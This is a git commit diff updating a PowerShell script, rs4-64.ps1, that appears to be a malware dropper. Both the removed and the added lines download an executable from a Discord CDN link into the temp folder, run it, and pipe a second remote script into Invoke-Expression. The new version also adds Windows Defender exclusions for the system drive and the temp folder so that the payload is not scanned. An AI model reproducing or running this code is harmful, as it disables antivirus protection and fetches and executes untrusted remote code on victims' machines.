fc2b02ff9a0fce1590fa375e679a3f95bf8d7c5f
Pancracio <38768857+Chapelo@users.noreply.github.com>
2024-08-02 13:22:29 +0200

    Update rs4-64.ps1

--- rs4-64.ps1
+++ rs4-64.ps1
@@ -1,3 +1,2 @@
-PowerShell.exe -WindowStyle hidden -NoP -Ep Bypass {
-    Set-ExecutionPolicy unrestricted -Force; Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1268572168074301451/distopan.exe?ex=66ace965&is=66ab97e5&hm=e9a96048cc908d906f69725a87634b8640fef7328090a9f6f638d36311fcab28&" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe"; irm https://raw.githubusercontent.com/Chapelo/rs/main/rs3-v1.ps1 | iex;
-}
+
+    Set-ExecutionPolicy unrestricted -Force; Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP ; Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1268572168074301451/distopan.exe?ex=66ace965&is=66ab97e5&hm=e9a96048cc908d906f69725a87634b8640fef7328090a9f6f638d36311fcab28&" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe"; irm https://raw.githubusercontent.com/Chapelo/rs/main/rs3-v1.ps1 | iex;
